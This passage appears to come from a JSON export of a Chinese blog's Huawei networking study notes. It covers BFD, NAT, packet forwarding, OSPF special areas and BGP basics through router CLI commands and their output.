12.1.1.1 discriminator local 40 discriminator remote 10 commit#return[R1]display bfd session all--------------------------------------------------------------------------------Local Remote PeerIpAddr State Type InterfaceName --------------------------------------------------------------------------------10 40 24.1.1.4 Up S_IP_PEER - -------------------------------------------------------------------------------- Total UP/DOWN Session Number : 1/0[R1]display bfd session all--------------------------------------------------------------------------------Local Remote PeerIpAddr State Type InterfaceName --------------------------------------------------------------------------------10 40 24.1.1.4 Down S_IP_PEER - -------------------------------------------------------------------------------- Total UP/DOWN Session Number : 0/1[R1]ip route-static 4.4.4.4 32 12.1.1.2 track bfd-session 14[R1]ping -c 500 -a 1.1.1.1 4.4.4.4 PING 4.4.4.4: 56 data bytes, press CTRL_C to break Reply from 4.4.4.4: bytes=56 Sequence=1 ttl=254 time=30 ms Reply from 4.4.4.4: bytes=56 Sequence=2 ttl=254 time=40 ms Reply from 4.4.4.4: bytes=56 Sequence=3 ttl=254 time=30 ms Reply from 4.4.4.4: bytes=56 Sequence=4 ttl=254 time=20 ms Reply from 4.4.4.4: bytes=56 Sequence=5 ttl=254 time=40 ms Reply from 4.4.4.4: bytes=56 Sequence=6 ttl=254 time=30 ms Reply from 4.4.4.4: bytes=56 Sequence=7 ttl=254 time=30 ms Reply from 4.4.4.4: bytes=56 Sequence=8 ttl=254 time=50 ms Reply from 4.4.4.4: bytes=56 Sequence=9 ttl=254 time=30 ms Reply from 4.4.4.4: bytes=56 Sequence=10 ttl=254 time=30 ms Reply from 4.4.4.4: bytes=56 Sequence=11 ttl=254 time=40 ms Reply from 4.4.4.4: bytes=56 Sequence=12 ttl=254 time=40 ms Reply from 4.4.4.4: bytes=56 Sequence=13 ttl=254 time=30 ms Reply from 4.4.4.4: bytes=56 Sequence=14 ttl=254 time=40 ms Reply from 4.4.4.4: bytes=56 Sequence=15 ttl=254 time=30 ms Reply from 4.4.4.4: bytes=56 Sequence=16 ttl=254 time=30 ms Request time out Request time outJan 24 2024 15:46:13-08:00 R1 %%01BFD/4/STACHG_TODWN(l)[1]:BFD session changed to Down. (SlotNumber=0, Discriminator=167772160, Diagnostic=DetectDown, Applications=None, ProcessPST=False, BindInterfaceName=None, InterfacePhysicalState=None, InterfaceProtocolState=None) Request time out Reply from 4.4.4.4: bytes=56 Sequence=20 ttl=254 time=30 ms Reply from 4.4.4.4: bytes=56 Sequence=21 ttl=254 time=30 ms Reply from 4.4.4.4: bytes=56 Sequence=22 ttl=254 time=40 ms Reply from 4.4.4.4: bytes=56 Sequence=23 ttl=254 time=30 ms Reply from 4.4.4.4: bytes=56 Sequence=24 ttl=254 time=30 ms Reply from 4.4.4.4: bytes=56 Sequence=25 ttl=254 time=30 ms Reply from 4.4.4.4: bytes=56 Sequence=26 ttl=254 time=40 ms Reply from 4.4.4.4: bytes=56 Sequence=27 ttl=254 time=30 ms Reply from 4.4.4.4: bytes=56 Sequence=28 ttl=254 time=40 ms OSPF 与 BFD 联动# R1interface LoopBack0 ip address 1.1.1.1 255.255.255.255 #ospf 1 router-id 1.1.1.1 bfd all-interfaces enable area 0.0.0.0 network 1.1.1.1 0.0.0.0 network 12.1.1.1 0.0.0.0 network 13.1.1.1 0.0.0.0 # R2interface LoopBack0 ip address 2.2.2.2 255.255.255.255 #ospf 1 router-id 2.2.2.2 bfd all-interfaces enable area 0.0.0.0 network 2.2.2.2 0.0.0.0 network 12.1.1.2 0.0.0.0 network 24.1.1.2 0.0.0.0 ## R3interface LoopBack0 ip address 3.3.3.3 255.255.255.255 #ospf 1 router-id 3.3.3.3 bfd all-interfaces enable area 0.0.0.0 network 3.3.3.3 0.0.0.0 network 13.1.1.3 0.0.0.0 network 34.1.1.3 0.0.0.0 ## R4interface LoopBack0 ip address 4.4.4.4 255.255.255.255 #ospf 1 router-id 4.4.4.4 bfd all-interfaces enable area 0.0.0.0 network 4.4.4.4 0.0.0.0 network 24.1.1.4 0.0.0.0 network 34.1.1.4 0.0.0.0 #[R1]dis bfd session all --------------------------------------------------------------------------------Local Remote PeerIpAddr State Type InterfaceName --------------------------------------------------------------------------------8192 8192 12.1.1.2 Up D_IP_IF GigabitEthernet0/0/0 8195 8195 13.1.1.3 Up D_IP_IF GigabitEthernet0/0/1 -------------------------------------------------------------------------------- Total UP/DOWN Session Number : 2/0"},{"title":"","date":"2024-01-09T07:00:00.000Z","updated":"2024-01-09T07:00:00.000Z","comments":true,"path":"notes/datacom/20.html","permalink":"https://blog.mhuig.top/notes/datacom/20","excerpt":"","text":"NAT 网络地址转换 NAT 网络地址转换 NATNAT: 网络地址转换 用于实现位于内部网络访问外部网络的功能. 作用: 当局域网内的主机需要访问外网时, 通过 NAT 技术, 将私网地址转换为外网地址, 并可以实现多个私网用户共用一个公网地址, 既保证网络的互通, 又节省公网地址. NAT 种类1. 静态 NAT: 私网地址与公网地址一对一的映射, 一个公网地址只会分配给唯一且固定的内网主机, 适用于小型网络, 某台服务器对外服务时使用. 2. 动态 NAT: 通过地址池进行分配, 出口设备会从配置的公网地址池中选择一个未分配的公网地址, 当不需要连接时, 对应的地址映射关系会被解除, 公网地址恢复到地址池中, 如果地址池中的地址用尽后, 只能等待被占用的公网地址释放后, 其他主机才能使用. 3.NAPT: 网络地址端口转换, 允许将多个内部地址映射到同一个公网地址的不同端口 4.easy IP: 允许将多个内部地址映射到出口设备的公网 IP 地址的不同端口上 5.NAT Server: 可以实现当私网需要向公网提供服务时私网中的服务器随时可以提供访问. Shell静态[R1-GigabitEthernet0/0/1]nat static global 12.1.1.3 inside 192.168.1.1 动态 NAT / NAPT系统视图创建公网地址池[R1]nat address-group 1 12.1.1.3 12.1.1.3创建允许私网通过规则[R1]acl 2000[R1-acl-basic-2000]rule permit source 192.168.1.0 0.0.0.255连接外网的网关接口下[R1-GigabitEthernet0/0/1]nat outbound 2000 address-group 1 // NAPT[R1-GigabitEthernet0/0/1]nat outbound 2000 address-group 1 no-pat // 动态地址池 将ACL和地址池关联起来 [R1]nat ? address-group IP address-group of NAT alg Application level gateway dns-map DNS mapping filter-mode NAT filter mode link-down Link down reset session function mapping-mode NAT mapping mode overlap-address Overlap address pool to temp address pool map static Specify static NAT[R1]nat address-group ? INTEGER&lt;0-7&gt; Index of address-group[R1]nat address-group 1 ? IP_ADDR&lt;X.X.X.X&gt; Start address[R1]nat address-group 1 12.1.1.3 ? IP_ADDR&lt;X.X.X.X&gt; End address[R1]nat address-group 1 12.1.1.3 12.1.1.3ACL[R1]acl 2000[R1-acl-basic-2000]rule permit source 192.168.1.0 0.0.0.255接口调用ACL2000[R1]int g0/0/1[R1-GigabitEthernet0/0/1]nat ? outbound Specify net address translation server Specify NAT server static Specify static NAT[R1-GigabitEthernet0/0/1]nat outbound ? INTEGER&lt;2000-3999&gt; Apply basic or advanced ACL[R1-GigabitEthernet0/0/1]nat outbound 2000 ? address-group IP address-group of NAT interface Specify the interface &lt;cr&gt; Please press ENTER to execute command [R1-GigabitEthernet0/0/1]nat outbound 2000 address-group 1[R1-GigabitEthernet0/0/1]nat outbound 2000 address-group 1 // NAPT[R1-GigabitEthernet0/0/1]nat outbound 2000 address-group 1 no-pat // 动态地址池 easy IP创建允许私网通过规则[R1]acl 2000[R1-acl-basic-2000]rule permit source 192.168.1.0 0.0.0.255连接外网的网关接口下[R1-GigabitEthernet0/0/1]nat outbound 2000 查看 nat 会话表[R1]display nat session all NAT Session Table Information: Protocol : ICMP(1) SrcAddr Vpn : 192.168.1.2 DestAddr Vpn : 12.1.1.2 Type Code IcmpId : 0 8 3222 NAT-Info New SrcAddr : 12.1.1.1 New DestAddr : ---- New IcmpId : 10939 Protocol : ICMP(1) SrcAddr Vpn : 192.168.1.2 DestAddr Vpn : 12.1.1.2 Type Code IcmpId : 0 8 3224 NAT-Info New SrcAddr : 12.1.1.1 New DestAddr : ---- New IcmpId : 10943 Protocol : ICMP(1) SrcAddr Vpn : 192.168.1.1 DestAddr Vpn : 12.1.1.2 Type Code IcmpId : 0 8 3221 NAT-Info New SrcAddr : 12.1.1.1 New DestAddr : ---- New IcmpId : 10936 NAT Server[R5]ip route-static 0.0.0.0 0 45.1.1.4user-interface vty 0 4 authentication-mode password set authentication password cipher 123456[R4-GigabitEthernet0/0/0]nat server protocol tcp global 34.1.1.5 23 inside 45.1.1.5 23"},{"title":"","date":"2023-12-18T07:00:00.000Z","updated":"2023-12-18T07:00:00.000Z","comments":true,"path":"notes/datacom/11.html","permalink":"https://blog.mhuig.top/notes/datacom/11","excerpt":"","text":"数据转发过程 数据转发过程 数据的封装和解封装传输层设备使用传输层协议进行报文封装, 填充源端口和目的端口, 标识位, 序列号等等, 之后交给网络层协议进行后续的封装. 网络层在网络层进行封装时, 要明确 IP 报文的源 IP 地址和目的 IP 地址, 并通过协议标识上一层协议, 封装完成后交给数据链路层进行封装. 数据链路层 如果访问的是同一网段的设备, 目的 MAC 不需要填写成网关设备的 MAC 地址, ARP 会直接请求目的 IP 设备的 MAC 地址. 如果访问的是其他网段的设备, 则需要通过网关转发出去, 那么就要获取到网关的 MAC 地址. 首先查看 ARP 缓存表, 如果表中记录着对应的 IP 地址和 MAC 地址的映射关系, 则直接进行二层封装. 如果没有对应的信息, 则通过 ARP 协议获取设备的 MAC 地址对二层进行封装, 填写源目 MAC, Type 字段完成后, 进行 FCS 检验填写. 物理层在数据帧前添加前导码以及定界符, 再通过 bit 流的形式在物理链路上进行传输. 解封装当设备收到一个数据帧时, 首先查看 FCS 字段, 检验数据帧是否完整, 之后再查看目的 MAC 地址, 查看数据帧是不是给自己的. 再看 IP 头部中的目的 IP 地址, 通过路由表查询去往该目的地的地址是否有对应的信息. 如果有对应的信息, 重新封装一个二层的头部和尾部. 到达最终的目的地时, 接收方会先检查 FCS 检查数据是否完整, 查看目的 MAC, 如果封装的是本设备的 MAC 地址, 通过 type 字段交给上层协议进行处理. 然后查看目的 IP 是否为本设备的 IP 地址, 如果是, 通过 Protocol 字段, 将数据交给上层协议进行处理. TCP / UDP 协议通过目的端口判断, 发送方想要访问本设备的哪种应用服务, 然后交给服务进行处理. 数据转发原理 需要先进行域名解析 向 DNS 服务器发送域名查询信息进行解析 baidu.com 对应的 IP 地址. DNS 服务器回应请求消息, 将百度服务器的 IP 地址告知 PC. DNS114 114.114.114.114阿里 223.5.5.5百度360DNS谷歌 8.8.8.8 开始封装, 在封装数据链路层时, 发现目的 IP 与源 IP 不在同一网络中, 这时通过 ARP 请求网关的 MAC 地址, 并进行封装 当数据经过交换机时, 交换机根据 MAC 地址表进行转发, 交给网关处理. 网关收到数据帧后, 进行解封装, 查看 MAC 地址为自己的 MAC 地址, 继续解封装, 发现目的 IP 地址并不是自己的 IP 地址, 需要根据路由表重新封装数据帧并转发. 服务器在收到消息后解封装处理, 最终将数据交给对应的应用服务. AR1&lt;Huawei&gt;sy &lt;Huawei&gt;system-view Enter system view, return user view with Ctrl+Z.[Huawei]sy [Huawei]sysname R1[R1]int [R1]interface g0/0/0[R1-GigabitEthernet0/0/0]ip add [R1-GigabitEthernet0/0/0]ip address 192.168.1.254 ? INTEGER&lt;0-32&gt; Length of IP address mask IP_ADDR&lt;X.X.X.X&gt; IP address mask[R1-GigabitEthernet0/0/0]ip address 192.168.1.254 24Dec 18 2023 15:34:43-08:00 R1 %%01IFNET/4/LINK_STATE(l)[0]:The line protocol IP on the interface GigabitEthernet0/0/0 has entered the UP state. [R1-GigabitEthernet0/0/0][R1-GigabitEthernet0/0/0][R1-GigabitEthernet0/0/0]interface g0/0/1[R1-GigabitEthernet0/0/1][R1-GigabitEthernet0/0/1]ip address 10.1.1.254 24Dec 18 2023 15:36:09-08:00 R1 %%01IFNET/4/LINK_STATE(l)[1]:The line protocol IP on the interface GigabitEthernet0/0/1 has entered the UP state. [R1-GigabitEthernet0/0/1][R1-GigabitEthernet0/0/1][R1-GigabitEthernet0/0/1][R1-GigabitEthernet0/0/1]q[R1]q&lt;R1&gt;sa &lt;R1&gt;save The current configuration will be written to the device. Are you sure to continue? (y/n)[n]:y It will take several minutes to save configuration file, please wait....... Configuration file had been saved successfully Note: The configuration file will take effect after being activated&lt;R1&gt;&lt;R1&gt;&lt;R1&gt;&lt;R1&gt;syEnter system view, return user view with Ctrl+Z.[R1]dis [R1]display inter [R1]display interface g0/0/0GigabitEthernet0/0/0 current state : UPLine protocol current state : UPLast line protocol up time : 2023-12-18 15:34:43 UTC-08:00Description:HUAWEI, AR Series, GigabitEthernet0/0/0 InterfaceRoute Port,The Maximum Transmit Unit is 1500Internet Address is 192.168.1.254/24IP Sending Frames' Format is PKTFMT_ETHNT_2, Hardware address is 00e0-fc7d-4606Last physical up time : 2023-12-18 15:21:06 UTC-08:00Last physical down time : 2023-12-18 15:20:59 UTC-08:00Current system time: 2023-12-18 15:40:47-08:00Port Mode: FORCE COPPERSpeed : 1000, Loopback: NONEDuplex: FULL, Negotiation: ENABLEMdi : AUTOLast 300 seconds input rate 456 bits/sec, 0 packets/secLast 300 seconds output rate 16 bits/sec, 0 packets/secInput peak rate 1040 bits/sec,Record time: 2023-12-18 15:39:01Output peak rate 472 bits/sec,Record time: 2023-12-18 15:39:01Input: 562 packets, 65813 bytes Unicast: 16, Multicast: 541 Broadcast: 5, Jumbo: 0 Discard: 0, Total Error: 0 CRC: 0, Giants: 0 Jabbers: 0, Throttles: 0 Runts: 0, Symbols: 0 Ignoreds: 0, Frames: 0Output: 17 packets, 1216 bytes Unicast: 15, Multicast: 0 Broadcast: 2, Jumbo: 0 Discard: 0, Total Error: 0 Collisions: 0, ExcessiveCollisions: 0 Late Collisions: 0, Deferreds: 0 Input bandwidth utilization threshold : 100.00% Output bandwidth utilization threshold: 100.00% Input bandwidth utilization : 0% Output bandwidth utilization : 0%[R1][R1][R1]display interface g0/0/1GigabitEthernet0/0/1 current state : UPLine protocol current state : UPLast line protocol up time : 2023-12-18 15:36:09 UTC-08:00Description:HUAWEI, AR Series, GigabitEthernet0/0/1 InterfaceRoute Port,The Maximum Transmit Unit is 1500Internet Address is 10.1.1.254/24IP Sending Frames' Format is PKTFMT_ETHNT_2, Hardware address is 00e0-fc7d-4607Last physical up time : 2023-12-18 15:21:06 UTC-08:00Last physical down time : 2023-12-18 15:20:59 UTC-08:00Current system time: 2023-12-18 15:42:10-08:00Port Mode: COMMON COPPERSpeed : 1000, Loopback: NONEDuplex: FULL, Negotiation: ENABLEMdi : AUTOLast 300 seconds input rate 16 bits/sec, 0 packets/secLast 300 seconds output rate 16 bits/sec, 0 packets/secInput peak rate 472 bits/sec,Record time: 2023-12-18 15:39:01Output peak rate 472 bits/sec,Record time: 2023-12-18 15:39:01Input: 12 packets, 810 bytes Unicast: 10, Multicast: 0 Broadcast: 2, Jumbo: 0 Discard: 0, Total Error: 0 CRC: 0, Giants: 0 Jabbers: 0, Throttles: 0 Runts: 0, Symbols: 0 Ignoreds: 0, Frames: 0Output: 11 packets, 786 bytes Unicast: 9, Multicast: 0 Broadcast: 2, Jumbo: 0 Discard: 0, Total Error: 0 Collisions: 0, ExcessiveCollisions: 0 Late Collisions: 0, Deferreds: 0 Input bandwidth utilization threshold : 100.00% Output bandwidth utilization threshold: 100.00% Input bandwidth utilization : 0% Output bandwidth utilization : 0%[R1][R1][R1]"},{"title":"","date":"2024-02-22T02:00:00.000Z","updated":"2024-02-22T02:00:00.000Z","comments":true,"path":"notes/datacom/23.html","permalink":"https://blog.mhuig.top/notes/datacom/23","excerpt":"","text":"OSPF 特殊区域 OSPF 特殊区域 什么时候使用特殊区域(目的: 减少 LSDB 的规模) 1. 网络末端 2. 路由器性能低下 Stub 区域Stub (末节区域) Stub 中只有 1LSA,2LSA,3LSA 以及一个描述缺省路由的 3LSA LSA5,LSA4 不允许发布到 STUB 区域中, 到达 AS 外的路由只能基于 ABR 生成的默认路由 STUB 区域可以减少 STUB 区域内路由器的 LSDB 规模和对设备的需求 [R6-ospf-1-area-0.0.0.1]stub [R4-ospf-1-area-0.0.0.1]stub[R6]dis ospf lsdb OSPF Process 1 with Router ID 6.6.6.6 Link State Database Area: 0.0.0.1 Type LinkState ID AdvRouter Age Len Sequence Metric Router 4.4.4.4 4.4.4.4 95 36 80000003 1 Router 6.6.6.6 6.6.6.6 94 84 80000007 1 Network 46.1.1.6 6.6.6.6 94 32 80000001 0 Sum-Net 5.5.5.5 4.4.4.4 85 28 80000001 50 Sum-Net 3.3.3.3 4.4.4.4 90 28 80000001 49 Sum-Net 14.1.1.0 4.4.4.4 128 28 80000001 48 Sum-Net 123.1.1.0 4.4.4.4 117 28 80000001 49 Sum-Net 4.4.4.4 4.4.4.4 137 28 80000001 0 Sum-Net 2.2.2.2 4.4.4.4 85 28 80000001 49 Sum-Net 25.1.1.0 4.4.4.4 85 28 80000001 50 Sum-Net 1.1.1.1 4.4.4.4 117 28 80000001 48 Sum-Asbr 5.5.5.5 4.4.4.4 85 28 80000001 50 AS External Database Type LinkState ID AdvRouter Age Len Sequence Metric External 20.1.0.0 5.5.5.5 151 36 80000001 2 External 7.7.7.7 5.5.5.5 151 36 80000001 1 External 5.5.5.5 5.5.5.5 160 36 80000001 1 External 25.1.1.0 5.5.5.5 131 36 80000001 1 External 57.1.1.0 5.5.5.5 151 36 80000001 1 [R6]ospf 1[R6-ospf-1]a 1[R6-ospf-1-area-0.0.0.1]stub ? no-summary Do not send summary LSA into stub area &lt;cr&gt; Please press ENTER to execute command [R6-ospf-1-area-0.0.0.1]stub [R4]ospf 1[R4-ospf-1]a 1[R4-ospf-1-area-0.0.0.1]stub[R6-ospf-1-area-0.0.0.1]dis ospf lsdb OSPF Process 1 with Router ID 6.6.6.6 Link State Database Area: 0.0.0.1 Type LinkState ID AdvRouter Age Len Sequence Metric Router 4.4.4.4 4.4.4.4 41 36 80000004 1 Router 6.6.6.6 6.6.6.6 40 84 80000005 1 Network 46.1.1.6 6.6.6.6 40 32 80000001 0 Sum-Net 0.0.0.0 4.4.4.4 86 28 80000001 1 Sum-Net 5.5.5.5 4.4.4.4 86 28 80000001 50 Sum-Net 3.3.3.3 4.4.4.4 86 28 80000001 49 Sum-Net 14.1.1.0 4.4.4.4 86 28 80000001 48 Sum-Net 123.1.1.0 4.4.4.4 86 28 80000001 49 Sum-Net 4.4.4.4 4.4.4.4 86 28 80000001 0 Sum-Net 2.2.2.2 4.4.4.4 86 28 80000001 49 Sum-Net 25.1.1.0 4.4.4.4 86 28 80000001 50 Sum-Net 1.1.1.1 4.4.4.4 86 28 80000001 48 Totally Stub 区域Totally Stub (完全末节区域):只有 1LSA,2LSA 以及一条描述缺省路由的 3LSA (所有的 Stub 区域都无法引入外部路由) [R6-ospf-1-area-0.0.0.1]stub no-summary [R4-ospf-1-area-0.0.0.1]stub no-summary [R6-ospf-1-area-0.0.0.1]dis ospf lsdb OSPF Process 1 with Router ID 6.6.6.6 Link State Database Area: 0.0.0.1 Type LinkState ID AdvRouter Age Len Sequence Metric Router 4.4.4.4 4.4.4.4 35 36 80000009 1 Router 6.6.6.6 6.6.6.6 32 84 8000000B 1 Network 46.1.1.6 6.6.6.6 32 32 80000002 0 Sum-Net 0.0.0.0 4.4.4.4 280 28 80000001 1 NSSA 区域NSSA (次末节区域):不接受且不生成 4LSA,5LSA, 但可以引入外部路由, 会生成一个 7LSA, 描述外部路由. 同时 ABR 生成一个缺省路由, 由 7LSA 描述. 其他的普通区域不认识 7LSA,ABR 会将 7LSA 转换成 5LSA 进行泛洪. [R2]ospf 1[R2-ospf-1]a 2[R2-ospf-1-area-0.0.0.2]nssa[R5]ospf 1[R5-ospf-1]a 2[R5-ospf-1-area-0.0.0.2]nssa&lt;R2&gt;reset ospf 1 process&lt;R5&gt;reset ospf 1 process&lt;R5&gt;dis ospf lsdb OSPF Process 1 with Router ID 5.5.5.5 Link State Database Area: 0.0.0.2 Type LinkState ID AdvRouter Age Len Sequence Metric Router 2.2.2.2 2.2.2.2 50 36 80000004 1 Router 5.5.5.5 5.5.5.5 41 48 80000006 1 Network 25.1.1.5 5.5.5.5 41 32 80000002 0 Sum-Net 6.6.6.6 2.2.2.2 39 28 80000001 50 Sum-Net 3.3.3.3 2.2.2.2 51 28 80000001 1 Sum-Net 14.1.1.0 2.2.2.2 39 28 80000001 49 Sum-Net 123.1.1.0 2.2.2.2 88 28 80000001 1 Sum-Net 46.1.1.0 2.2.2.2 39 28 80000001 50 Sum-Net 4.4.4.4 2.2.2.2 39 28 80000001 49 Sum-Net 2.2.2.2 2.2.2.2 88 28 80000001 0 Sum-Net 1.1.1.1 2.2.2.2 39 28 80000001 1 Sum-Net 10.1.0.0 2.2.2.2 39 28 80000001 50 NSSA 20.1.0.0 5.5.5.5 91 36 80000001 2 NSSA 7.7.7.7 5.5.5.5 91 36 80000001 1 NSSA 5.5.5.5 5.5.5.5 95 36 80000002 1 NSSA 25.1.1.0 5.5.5.5 87 36 80000001 1 NSSA 57.1.1.0 5.5.5.5 91 36 80000001 1 NSSA 0.0.0.0 2.2.2.2 51 36 80000001 1 &lt;R2&gt;dis ospf lsdb OSPF Process 1 with Router ID 2.2.2.2 Link State Database Area: 0.0.0.0 Type LinkState ID AdvRouter Age Len Sequence Metric Router 4.4.4.4 4.4.4.4 154 60 80000006 0 Router 2.2.2.2 2.2.2.2 119 48 80000009 1 Router 1.1.1.1 1.1.1.1 125 72 8000000B 1 Router 3.3.3.3 3.3.3.3 120 48 8000000A 1 Network 123.1.1.3 3.3.3.3 120 36 80000005 0 Sum-Net 6.6.6.6 4.4.4.4 140 28 80000001 1 Sum-Net 5.5.5.5 2.2.2.2 132 28 80000001 1 Sum-Net 46.1.1.0 4.4.4.4 180 28 80000001 1 Sum-Net 25.1.1.0 2.2.2.2 172 28 80000001 1 Sum-Net 10.1.0.0 4.4.4.4 140 28 80000001 1 Area: 0.0.0.2 Type LinkState ID AdvRouter Age Len Sequence Metric Router 2.2.2.2 2.2.2.2 134 36 80000004 1 Router 5.5.5.5 5.5.5.5 127 48 80000006 1 Network 25.1.1.5 5.5.5.5 127 32 80000002 0 Sum-Net 6.6.6.6 2.2.2.2 123 28 80000001 50 Sum-Net 3.3.3.3 2.2.2.2 135 28 80000001 1 Sum-Net 14.1.1.0 2.2.2.2 123 28 80000001 49 Sum-Net 123.1.1.0 2.2.2.2 172 28 80000001 1 Sum-Net 46.1.1.0 2.2.2.2 123 28 80000001 50 Sum-Net 4.4.4.4 2.2.2.2 123 28 80000001 49 Sum-Net 2.2.2.2 2.2.2.2 172 28 80000001 0 Sum-Net 1.1.1.1 2.2.2.2 123 28 80000001 1 Sum-Net 10.1.0.0 2.2.2.2 123 28 80000001 50 NSSA 0.0.0.0 2.2.2.2 135 36 80000001 1 NSSA 20.1.0.0 5.5.5.5 177 36 80000001 2 NSSA 7.7.7.7 5.5.5.5 177 36 80000001 1 NSSA 5.5.5.5 5.5.5.5 182 36 80000002 1 NSSA 25.1.1.0 5.5.5.5 174 36 80000001 1 NSSA 57.1.1.0 5.5.5.5 178 36 80000001 1 AS External Database Type LinkState ID AdvRouter Age Len Sequence Metric External 20.1.0.0 2.2.2.2 133 36 80000001 2 External 7.7.7.7 2.2.2.2 133 36 80000001 1 External 57.1.1.0 2.2.2.2 133 36 80000001 1 Totally NSSA 区域Totally NSSA (完全次末节区域): 只有 1LSA,2LSA,7LSA 和一条描述缺省路由的 3LSA, 一条描述缺省路由的 7LSA 骨干区域不能作为特殊区域 虚连接不能穿越骨干区域 [R5]ospf[R5-ospf-1]a 2[R5-ospf-1-area-0.0.0.2]nssa no-summary[R2]ospf[R2-ospf-1]a 2[R2-ospf-1-area-0.0.0.2]nssa no-summary[R5-ospf-1-area-0.0.0.2]dis ospf lsdb OSPF Process 1 with Router ID 5.5.5.5 Link State Database Area: 0.0.0.2 Type LinkState ID AdvRouter Age Len Sequence Metric Router 2.2.2.2 2.2.2.2 34 36 8000000A 1 Router 5.5.5.5 5.5.5.5 33 48 8000000C 1 Network 25.1.1.2 2.2.2.2 34 32 80000002 0 Sum-Net 0.0.0.0 2.2.2.2 56 28 80000001 1 NSSA 20.1.0.0 5.5.5.5 44 36 80000003 2 NSSA 7.7.7.7 5.5.5.5 44 36 80000001 1 NSSA 5.5.5.5 5.5.5.5 44 36 80000002 1 NSSA 25.1.1.0 5.5.5.5 44 36 80000001 1 NSSA 57.1.1.0 5.5.5.5 44 36 80000001 1 NSSA 0.0.0.0 2.2.2.2 56 36 80000001 1 [R2-ospf-1-area-0.0.0.2]dis ospf lsdb OSPF Process 1 with Router ID 2.2.2.2 Link State Database Area: 0.0.0.0 Type LinkState ID AdvRouter Age Len Sequence Metric Router 4.4.4.4 4.4.4.4 575 60 80000006 0 Router 2.2.2.2 2.2.2.2 540 48 80000009 1 Router 1.1.1.1 1.1.1.1 546 72 8000000B 1 Router 3.3.3.3 3.3.3.3 541 48 8000000A 1 Network 123.1.1.3 3.3.3.3 541 36 80000005 0 Sum-Net 6.6.6.6 4.4.4.4 561 28 80000001 1 Sum-Net 5.5.5.5 2.2.2.2 28 28 80000001 1 Sum-Net 46.1.1.0 4.4.4.4 601 28 80000001 1 Sum-Net 25.1.1.0 2.2.2.2 51 28 80000002 1 Sum-Net 10.1.0.0 4.4.4.4 561 28 80000001 1 Area: 0.0.0.2 Type LinkState ID AdvRouter Age Len Sequence Metric Router 2.2.2.2 2.2.2.2 29 36 8000000A 1 Router 5.5.5.5 5.5.5.5 30 48 8000000C 1 Network 25.1.1.2 2.2.2.2 29 32 80000002 0 Sum-Net 0.0.0.0 2.2.2.2 51 28 80000001 1 NSSA 0.0.0.0 2.2.2.2 51 36 80000001 1 NSSA 20.1.0.0 5.5.5.5 41 36 80000003 2 NSSA 7.7.7.7 5.5.5.5 598 36 80000001 1 NSSA 5.5.5.5 5.5.5.5 602 36 80000002 1 NSSA 25.1.1.0 5.5.5.5 594 36 80000001 1 NSSA 57.1.1.0 5.5.5.5 598 36 80000001 1 AS External Database Type LinkState ID AdvRouter Age Len Sequence Metric External 20.1.0.0 2.2.2.2 28 36 80000001 2 External 7.7.7.7 2.2.2.2 28 36 80000001 1 External 57.1.1.0 2.2.2.2 28 36 80000001 1"},{"title":"","date":"2024-03-04T02:00:00.000Z","updated":"2024-03-11T02:00:00.000Z","comments":true,"path":"notes/datacom/24.html","permalink":"https://blog.mhuig.top/notes/datacom/24","excerpt":"","text":"BGP BGP BGPBGP: 边界网关协议, 是目前唯一的一种 EGP 协议. 是一种增强型的路径矢量路由协议. AS: 自治系统, 是由同一个技术机构进行管理并且运行相同的选路策略的一组路由设备. AS 号: 1-65535. 1-64511 共有 AS. 64512-65535 私有 AS. 是一个 16bit 的整数, 目前新版本的 BGP 支持 4 字节的 AS 号. IGP 着重于发现路由和计算路由. BGP 着重于控制路由, 传播路由以及最优的路径选择. BGP 特征 BGP 具备可靠的路由更新机制. 基于 TCP 协议传递报文, 协议号为 179. BGP 具备丰富的度量值. 从设计上避免了环路. 附带多种路由属性. 支持 CIDR, 具备丰富的路由过滤和路由策略机制. BGP 无周期更新, 只会通过周期性发送 Keepalive 报文来检测 TCP 的连通性. (OSPF 有周期性更新, OSPF LSA 周期性更新默认 1800s 老化 3600s) 只进行增量更新.(只更新变化的路由) 所有的报文属性均采用 TLV 结构, 增强扩展性. BGP 路由传递在两个 AS 之间运行的 BGP PEER 称为 EBGP (外部 BGP) 在两个 AS 内部运行的 BGP PEER 称为 IBGP (内部 BGP) BGP 的报文 Open: 用于负责建立 BGP 对等体以及协商对等体之间相关参数. Keepalive: 周期性 (60s) 发送, 用于检测 BGP PEER 之间的连通性. 如果在 180s 内没有收到对方的 Keepalive 报文则认为邻居失效. Update: 用于在 BGP 对等体之间来传递路由信息, 可以用于新路由的更新, 也可以用于老路由的撤销. Notification: 当 BGP 设备检测到错误信息时, 会发送 Notification 报文通知对等体. Route-refresh: 用来通知对等体路由刷新. EBGP 基础配置1. 创建 BGP 进程并设置 RID 2. 指定对等体 IP 地址, 以及 AS 号 [R1]bgp ? INTEGER&lt;1-65535&gt; 2-byte autonomous system number STRING&lt;3-11&gt; 4-byte autonomous system number (number&lt;1-65535&gt;.number&lt;0-65535&gt;)[R1]bgp 100[R1-bgp]router-id 1.1.1.1[R1-bgp]peer 12.1.1.2 as-number 200[R2]bgp 200[R2-bgp]router-id 2.2.2.2[R2-bgp]peer 12.1.1.1 as-number 100[R2-bgp]查看 bgp 状态[R1-bgp]display bgp peer BGP local router ID : 1.1.1.1 Local AS number : 100 Total number of peers : 1 Peers in established state : 1 Peer V AS MsgRcvd MsgSent OutQ Up/Down State PrefRcv 12.1.1.2 4 200 2 3 0 00:00:23 Established 0[R1-bgp]IP协议号6:TCP1:ICMP17:UDP89:OSPF[R1-GigabitEthernet0/0/0]shutdown[R1-GigabitEthernet0/0/0]undo shutdown BGP 协议头 Marker: 标记信息, 共 16 字节, 固定全为 1. Length: 长度, 包含 BGP 头部与报文内容的总长度. 共 2 字节 Type: 类型, 用于标识 BGP 报文类型. 1, 表示 Open 2, 表示 Update 3, 表示 Notification 4, 表示 Keepalive 5, 表示 Route-refresh Open 报文字段 1.version: 表示当前使用的 BGP 版本. 目前使用的 BGP 版本为 BGP 4+,所以目前该字段固定为 4. 2.my as: 表示当前 BGP 设备自身的 AS 号 3.hold time: 保持时间, 用于表示 BGP keepalive 报文的超时时间. 如果两台设备时间不一致, 则按照较小值为准. 4.RID: 用于标识当前设备的 RID. 5. 可选参数长度: 用于标识 BGP 可选参数信息的长度. 6. 可选参数: 用于协商 BGP 的能力, 以及相关参数. 可选参数由 TLV 结构组成TLV 结构: 通过 TLV 结构可以大大增加协议自身的扩展性. Type: 表示当前 TLV 结构的类型. Length: 表示当前 TLV 结构的长度. Value: 表示当前 TLV 结构的数值. Keepalive 报文字段只包含 BGP 的协议头, 无报文字段内容. Update 报文字段 Withdrawn routes length: 无效路由长度, 